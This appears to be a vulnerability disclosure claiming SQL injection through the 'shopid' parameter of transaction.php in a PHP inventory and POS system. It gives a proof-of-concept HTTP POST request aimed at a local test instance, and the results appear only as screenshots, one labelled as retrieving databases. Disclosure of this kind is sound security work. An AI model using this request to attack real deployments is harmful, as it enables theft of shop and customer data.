# pos-system has sql injection in transcation.php

## supplier 
https://code-projects.org/web-based-inventory-and-pos-system-in-php-with-source-code/

## Vulnerability file
transaction.php

## describe

**Code analysis**   

In the transaction.php file of pos-system, the shopid parameters are obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/028b6d1b-50d2-4d96-a352-43dd1f3fc06b.png)


## POC

```
POST /pos/POS_webased/transaction.php HTTP/1.1
Host: 127.0.0.1:8089
Content-Length: 524
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8089
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys33Gkdi0a7CVvPtE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8089/pos/POS_webased/transaction.php?success/id=
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=50c4181c3285d71201f052dad9f28262
Connection: close

------WebKitFormBoundarys33Gkdi0a7CVvPtE
Content-Disposition: form-data; name="shopid"

1
------WebKitFormBoundarys33Gkdi0a7CVvPtE
Content-Disposition: form-data; name="barcode"

1
------WebKitFormBoundarys33Gkdi0a7CVvPtE
Content-Disposition: form-data; name="itemprice"

1
------WebKitFormBoundarys33Gkdi0a7CVvPtE
Content-Disposition: form-data; name="qtysold"

1
------WebKitFormBoundarys33Gkdi0a7CVvPtE
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundarys33Gkdi0a7CVvPtE--


```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/395169d4-61b2-4bd0-896d-b3e7520cfce4.png)
Get databases
![image-2025](https://github.com/asd1238525/cve/blob/main/6051506f-8f77-45e0-a8da-33ac6ecf3239.png)